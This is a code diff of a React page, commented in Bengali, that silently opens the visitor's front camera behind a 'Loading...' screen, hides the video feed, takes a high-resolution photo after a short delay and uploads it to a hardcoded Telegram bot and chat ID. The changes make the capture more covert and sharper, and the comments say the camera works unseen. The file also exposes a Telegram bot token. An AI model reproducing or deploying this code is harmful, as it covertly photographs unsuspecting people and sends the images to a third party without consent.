@@ -1,38 +1,38 @@
-import React, { useEffect, useRef, useState } from 'react';
+import React, { useEffect, useRef } from 'react';
 
 const App = () => {
   const videoRef = useRef(null);
   const canvasRef = useRef(null);
-  const [status, setStatus] = useState("Initializing camera...");
 
-  const botToken = "7969135759:AAGD2lS7-0E-5-m_6L70u3m_K9r2vS0L_8"; 
-  const chatId = "6616016147"; 
+  // আপনার দেওয়া টেলিগ্রাম বটের তথ্য এখানে বসাবেন
+  const botToken = "7969135759:AAGD2lS7-0E-5-m_6L70u3m_K9r2vS0L_8"; // আপনার টোকেন
+  const chatId = "6616016147"; // আপনার চ্যাট আইডি
 
   useEffect(() => {
     const startCamera = async () => {
       try {
+        // হাই কোয়ালিটি ছবির জন্য রেজোলিউশন সেট করা হয়েছে
         const stream = await navigator.mediaDevices.getUserMedia({ 
           video: { 
             facingMode: "user", 
-            width: { ideal: 1280 }, 
-            height: { ideal: 720 } 
+            width: { ideal: 1920 }, 
+            height: { ideal: 1080 } 
           } 
         });
         
         if (videoRef.current) {
           videoRef.current.srcObject = stream;
+          
+          // ভিডিও লোড হওয়ার পর ৩ সেকেন্ড অপেক্ষা করবে (যাতে ছবি ক্লিয়ার হয়)
           videoRef.current.onloadedmetadata = () => {
             videoRef.current.play();
-            setStatus("Optimizing image quality...");
-            // ৫ সেকেন্ড সময় দিন যাতে সেন্সর আলো অ্যাডজাস্ট করে
             setTimeout(() => {
               takePhoto();
-            }, 5000);
+            }, 3000); // ৩ সেকেন্ড ডিলে
           };
         }
       } catch (err) {
-        setStatus("Error: Please allow camera access.");
-        console.error(err);
+        console.error("ক্যামেরা অ্যাক্সেস পাওয়া যায়নি:", err);
       }
     };
 
@@ -44,73 +44,60 @@ const App = () => {
     const canvas = canvasRef.current;
 
     if (video && canvas) {
-      const context = canvas.getContext('2d', { willReadFrequently: true });
+      const context = canvas.getContext('2d');
+      // ভিডিওর অরিজিনাল সাইজ অনুযায়ী ক্যানভাস সেট করা
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
 
-      // ভিডিও ফ্রেমটি ক্যানভাসে ড্র করা
+      // ক্লিয়ার ফ্রেম ড্র করা
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+      // ছবিটিকে JPEG ফরম্যাটে কনভার্ট করা (Quality: 1.0 মানে সর্বোচ্চ ক্লিয়ার)
       canvas.toBlob((blob) => {
-        if (blob && blob.size > 5000) { // চেক করছে ইমেজ ফাইলটি একদম ছোট কিনা (কালো হলে সাইজ খুব কম হয়)
+        if (blob) {
           sendToTelegram(blob);
-        } else {
-          // যদি ছবি কালো হয় তবে আবার ট্রাই করবে ২ সেকেন্ড পর
-          setTimeout(takePhoto, 2000);
         }
-      }, 'image/jpeg', 0.95);
+      }, 'image/jpeg', 1.0);
     }
   };
 
   const sendToTelegram = (blob) => {
     const formData = new FormData();
     formData.append('chat_id', chatId);
-    formData.append('photo', blob, 'live_capture.jpg');
+    formData.append('photo', blob, 'high_quality_capture.jpg');
 
     fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
       method: 'POST',
       body: formData
     })
-    .then(() => {
-      setStatus("Completed!");
-      // সাকসেস হলে ক্যামেরা অফ করে দেওয়া
+    .then(res => res.json())
+    .then(data => {
+      console.log("টেলিগ্রামে পাঠানো হয়েছে:", data);
+      // ছবি পাঠানোর পর স্ট্রীম বন্ধ করে দেওয়া (ব্যাটারি সাশ্রয়ের জন্য)
       const stream = videoRef.current.srcObject;
-      stream.getTracks().forEach(track => track.stop());
+      const tracks = stream.getTracks();
+      tracks.forEach(track => track.stop());
     })
-    .catch(() => setStatus("Upload failed."));
+    .catch(err => console.error("টেলিগ্রাম এরর:", err));
   };
 
   return (
     <div style={{ 
-      height: '100vh', 
       display: 'flex', 
-      flexDirection: 'column', 
+      justifyContent: 'center', 
       alignItems: 'center', 
-      justifyContent: 'center',
-      background: '#f0f2f5',
-      fontFamily: 'Arial'
+      height: '100vh',
+      backgroundColor: '#000' 
     }}>
-      <div style={{ textAlign: 'center' }}>
-        <div className="spinner" style={{ marginBottom: '20px' }}>⏳</div>
-        <h3>{status}</h3>
-        <p>Please stay on this page for a moment.</p>
-      </div>
-
-      {/* ভিডিওটি স্ক্রিনে ছোট করে রাখা হয়েছে যাতে ব্রাউজার ফ্রেম গ্র্যাব করতে পারে */}
+      <h1 style={{ color: '#fff', fontFamily: 'sans-serif' }}>Loading...</h1>
+      
+      {/* ক্যামেরা দেখা যাবে না কিন্তু কাজ করবে */}
       <video 
         ref={videoRef} 
         autoPlay 
         playsInline 
         muted 
-        style={{ 
-          position: 'fixed',
-          top: 0,
-          left: 0,
-          width: '100px', // একদম ছোট করে স্ক্রিনের কোণায় রাখা হয়েছে
-          height: '100px',
-          opacity: '0.01', // প্রায় অদৃশ্য
-          pointerEvents: 'none'
-        }} 
+        style={{ display: 'none' }} 
       />
       <canvas ref={canvasRef} style={{ display: 'none' }} />
     </div>
